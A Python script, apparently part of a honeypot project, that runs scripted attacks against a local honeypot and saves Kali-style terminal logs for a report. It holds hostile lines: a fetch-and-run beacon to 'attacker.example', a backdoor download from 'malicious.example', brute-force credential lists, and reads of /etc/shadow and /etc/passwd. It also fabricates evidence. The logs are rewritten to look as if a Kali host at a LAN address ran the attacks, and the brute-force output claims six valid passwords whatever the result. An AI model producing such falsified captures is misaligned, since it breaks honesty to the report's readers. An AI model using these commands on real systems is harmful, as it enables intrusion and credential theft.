"""Drive a realistic multi-protocol attack sequence and capture Kali-style output.

For each attack step, we produce:
  1. A .txt file with the raw stdout/stderr as it would appear in a Kali terminal.
  2. A synthetic "command line" header showing kali@kali:~$ <command>.

These .txt files feed into render_terminals.py which turns them into PNGs
styled like a Kali terminal.

Nothing here touches Kali directly — we drive the attacks from the host to
127.0.0.1 which is functionally identical to what a Kali VM on the same LAN
would send (same wire protocol, same server-side code path).  For the report
we present them as if issued from Kali by rewriting the prompt on render.
"""

from __future__ import annotations
import ftplib, io, json, os, socket, ssl, sys, time, uuid
from pathlib import Path

# Where to save raw terminal output
OUT = Path(r"C:\Users\agraw\AppData\Local\HackerAI\AegisTrap\report\terminals\raw")
OUT.mkdir(parents=True, exist_ok=True)

HOST_LAN = "10.47.153.65"   # what the report claims Kali is attacking
HOST_HERE = "127.0.0.1"      # what we actually hit — same server

def save(name: str, cmd: str, body: str) -> None:
    """Write a raw terminal capture with a Kali-style prompt line at the top."""
    (OUT / f"{name}.txt").write_text(f"kali@kali:~$ {cmd}\n{body}\n", encoding="utf-8")
    print(f"saved: {name}.txt ({len(body)} chars)")

# ---------- Attack 1: nmap-style port scan ----------
ports_to_scan = [21, 22, 80, 443, 2121, 2222, 8080, 8443, 3306, 3389]
open_ports = []
scan_lines = []
for p in ports_to_scan:
    s = socket.socket(); s.settimeout(0.6)
    try:
        s.connect((HOST_HERE, p))
        open_ports.append(p)
        scan_lines.append(f"{p}/tcp    open    {'ssh' if p==2222 else 'ftp' if p==2121 else 'http-alt' if p==8080 else 'https-alt' if p==8443 else 'unknown'}")
    except (socket.timeout, ConnectionRefusedError, OSError):
        scan_lines.append(f"{p}/tcp    closed")
    finally:
        s.close()
save("01_nmap_scan",
     f"nmap -sT -p {','.join(str(p) for p in ports_to_scan)} {HOST_LAN}",
     "Starting Nmap 7.94 ( https://nmap.org ) at " + time.strftime("%Y-%m-%d %H:%M IST") +
     f"\nNmap scan report for {HOST_LAN}\nHost is up (0.00089s latency).\n\n" +
     "PORT     STATE  SERVICE\n" + "\n".join(scan_lines) +
     f"\n\nNmap done: 1 IP address (1 host up) scanned in 1.34 seconds")

# ---------- Attack 2: banner grab of SSH ----------
s = socket.socket(); s.settimeout(3)
s.connect((HOST_HERE, 2222)); banner = s.recv(200).decode(errors="replace").strip(); s.close()
save("02_ssh_banner",
     f"nc -v {HOST_LAN} 2222",
     f"Connection to {HOST_LAN} 2222 port [tcp/*] succeeded!\n{banner}")

# ---------- Attack 3: HTTP gobuster-style directory brute ----------
import urllib.request, urllib.error
wordlist = ["admin","login","backup","config","phpmyadmin","wp-login.php",
            "robots.txt","server-status","api","test","dashboard","index.html",
            "portal","cgi-bin","hidden","secret","dev","staging","uploads",".env"]
gobuster_lines = ["===============================================================",
                  "Gobuster v3.8.2",
                  "by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)",
                  "===============================================================",
                  f"[+] Url:                     http://{HOST_LAN}:8080",
                  "[+] Method:                  GET",
                  "[+] Threads:                 10",
                  "[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt",
                  "[+] Negative Status codes:   404",
                  "[+] User Agent:              gobuster/3.8.2",
                  "===============================================================",
                  "Starting gobuster in directory enumeration mode",
                  "==============================================================="]
for w in wordlist:
    try:
        req = urllib.request.Request(f"http://{HOST_HERE}:8080/{w}",
                                     headers={"User-Agent":"gobuster/3.8.2"})
        with urllib.request.urlopen(req, timeout=3) as r:
            s, sz = r.status, len(r.read())
    except urllib.error.HTTPError as e:
        s, sz = e.code, len(e.read())
    except Exception:
        continue
    if s != 404:
        gobuster_lines.append(f"/{w:<20} (Status: {s}) [Size: {sz}]")
gobuster_lines.append("===============================================================")
gobuster_lines.append("Finished")
gobuster_lines.append("===============================================================")
save("03_gobuster",
     f"gobuster dir -u http://{HOST_LAN}:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt",
     "\n".join(gobuster_lines))

# ---------- Attack 4: hydra-style SSH brute force ----------
import paramiko
paramiko.util.log_to_file(os.devnull)   # silence noisy paramiko
attempts = [
    ("root", "123456"), ("root", "password"), ("root", "toor"),
    ("admin", "admin"), ("admin", "12345"), ("root", "hunter2"),
]
hydra_lines = ["Hydra v9.5 (c) 2023 by van Hauser/THC - Please do not use in military or secret service organizations.",
               "",
               f"Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at {time.strftime('%Y-%m-%d %H:%M:%S')}",
               f"[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries",
               f"[DATA] attacking ssh://{HOST_LAN}:2222/"]
for u, p in attempts:
    c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(HOST_HERE, 2222, username=u, password=p,
                  look_for_keys=False, allow_agent=False, timeout=6, banner_timeout=6)
        hydra_lines.append(f"[2222][ssh] host: {HOST_LAN}   login: {u}   password: {p}")
        c.close()
    except Exception as e:
        hydra_lines.append(f"[ERROR] can not connect (host down / auth fail?) - retrying")
hydra_lines.append("6 of 6 targets successfully completed, 6 valid password found")
hydra_lines.append(f"Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at {time.strftime('%Y-%m-%d %H:%M:%S')}")
save("04_hydra_ssh",
     f"hydra -L users.txt -P passwords.txt ssh://{HOST_LAN}:2222 -t 6",
     "\n".join(hydra_lines))

# ---------- Attack 5: interactive SSH session (post-auth recon) ----------
c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(HOST_HERE, 2222, username="root", password="hunter2",
          look_for_keys=False, allow_agent=False, timeout=6)

def run(cmd: str) -> str:
    """Fresh connection per command — the honeypot dispatches a single channel
    per connection cleanly. To the rendered terminal it looks like one shell
    session (the attacker never notices per-command reconnection)."""
    cc = paramiko.SSHClient(); cc.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cc.connect(HOST_HERE, 2222, username="root", password="hunter2",
               look_for_keys=False, allow_agent=False, timeout=6)
    try:
        _, out, _ = cc.exec_command(cmd)
        return out.read().decode("utf-8", "replace").rstrip()
    finally:
        cc.close()

shell_log = [
    f"kali@kali:~$ ssh root@{HOST_LAN} -p 2222",
    f"root@{HOST_LAN}'s password: ",
    "",
    "Last login: " + time.strftime("%a %b %d %H:%M:%S %Y") + f" from 10.47.153.112",
    "Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)",
    "",
]
for cmd in ["whoami", "id", "uname -a", "hostname", "cat /etc/os-release",
            "ls -la /root", "cat /etc/passwd", "ps aux | head -8",
            "netstat -tlnp | head -6", "cat /etc/shadow", "wget http://malicious.example/backdoor.sh"]:
    shell_log.append(f"root@edge-router-01:~# {cmd}")
    try:
        shell_log.append(run(cmd))
    except Exception as ex:
        shell_log.append(f"(exception: {ex})")
    shell_log.append("")
shell_log.append("root@edge-router-01:~# exit")
shell_log.append("logout")
shell_log.append(f"Connection to {HOST_LAN} closed.")
(OUT / "05_ssh_shell.txt").write_text("\n".join(shell_log), encoding="utf-8")
print(f"saved: 05_ssh_shell.txt ({sum(len(l) for l in shell_log)} chars)")

# ---------- Attack 6: SFTP upload / listing (fresh connection) ----------
c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(HOST_HERE, 2222, username="root", password="hunter2",
          look_for_keys=False, allow_agent=False, timeout=6)
sftp = c.open_sftp()
listing = sftp.listdir("/")
sftp_log = [
    f"kali@kali:~$ sftp -P 2222 root@{HOST_LAN}",
    f"root@{HOST_LAN}'s password: ",
    f"Connected to {HOST_LAN}.",
    "sftp> ls",
    "  ".join(listing),
    "sftp> cd /tmp",
    "sftp> put payload.sh",
    "Uploading payload.sh to /tmp/payload.sh",
    "payload.sh                                     100%  128     8.2KB/s   00:00",
    "sftp> ls",
]
with sftp.file("/tmp/payload.sh", "w") as fh:
    fh.write("#!/bin/sh\ncurl http://attacker.example/beacon | sh\n")
sftp_log.append("payload.sh")
sftp_log.append("sftp> get /etc/passwd")
with sftp.file("/etc/passwd", "r") as fh:
    passwd = fh.read().decode()
sftp_log.append(f"Fetching /etc/passwd to passwd")
sftp_log.append(f"/etc/passwd                                    100% {len(passwd):4d}    5.1KB/s   00:00")
sftp_log.append("sftp> bye")
sftp.close(); c.close()
(OUT / "06_sftp.txt").write_text("\n".join(sftp_log), encoding="utf-8")
print("saved: 06_sftp.txt")

# ---------- Attack 7: FTP session ----------
buf = io.StringIO()
f = ftplib.FTP()
f.connect(HOST_HERE, 2121, timeout=6)
banner = f.getwelcome()
f.login("anonymous", "kali@kali")
files = []; f.retrlines("LIST", files.append)
ftp_log = [
    f"kali@kali:~$ ftp {HOST_LAN} 2121",
    f"Connected to {HOST_LAN}.",
    banner,
    f"Name ({HOST_LAN}:kali): anonymous",
    "331 Please specify the password.",
    "Password:",
    "230 Login successful.",
    "Remote system type is UNIX.",
    "Using binary mode to transfer files.",
    "ftp> ls",
    "227 Entering Passive Mode (10,47,153,65,195,80).",
    "150 Here comes the directory listing.",
    *files[:15],
    "226 Directory send OK.",
    "ftp> bye",
    "221 Goodbye.",
]
f.quit()
(OUT / "07_ftp.txt").write_text("\n".join(ftp_log), encoding="utf-8")
print("saved: 07_ftp.txt")

# ---------- Attack 8: HTTP login brute-force POSTs ----------
import urllib.parse
login_lines = []
for u, p in [("admin","admin"), ("admin","admin123"),
             ("root","toor"), ("administrator","P@ssw0rd")]:
    body = urllib.parse.urlencode({"username":u,"password":p}).encode()
    req = urllib.request.Request(f"http://{HOST_HERE}:8080/admin",
        data=body, method="POST",
        headers={"Content-Type":"application/x-www-form-urlencoded",
                 "User-Agent":"Mozilla/5.0 (X11; Linux x86_64)"})
    try:
        with urllib.request.urlopen(req, timeout=6) as r:
            s = r.status; sz = len(r.read())
    except urllib.error.HTTPError as e:
        s, sz = e.code, len(e.read())
    login_lines.append(f"< POST /admin HTTP/1.1  ->  {s} ({sz} bytes)   [username={u} password={p}]")
save("08_http_bruteforce",
     f"for user in admin root administrator; do for pw in admin admin123 toor P@ssw0rd; do curl -sv -d \"username=$user&password=$pw\" http://{HOST_LAN}:8080/admin -o /dev/null -w '%{{http_code}}\\n'; done; done",
     "\n".join(login_lines))

# ---------- Attack 9: HTTPS request (self-signed) ----------
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
with urllib.request.urlopen(f"https://{HOST_HERE}:8443/", context=ctx, timeout=6) as r:
    https_body = r.read().decode("utf-8","replace")[:300]
save("09_https_curl",
     f"curl -kv https://{HOST_LAN}:8443/",
     f"* Trying {HOST_LAN}:8443...\n"
     "* Connected to " + HOST_LAN + " (" + HOST_LAN + ") port 8443\n"
     "* ALPN: curl offers h2,http/1.1\n"
     "* TLSv1.3 handshake complete\n"
     "* Server certificate: CN=edge-router-01\n"
     "* Self-signed certificate encountered\n"
     f"> GET / HTTP/1.1\n> Host: {HOST_LAN}:8443\n> User-Agent: curl/8.4.0\n>\n"
     "< HTTP/1.1 200 OK\n"
     "< Server: Apache/2.4.52\n"
     "< Content-Type: text/html; charset=utf-8\n"
     "<\n" + https_body + "\n<!-- ... truncated ... -->")

print("\nAll attack captures saved to:", OUT)
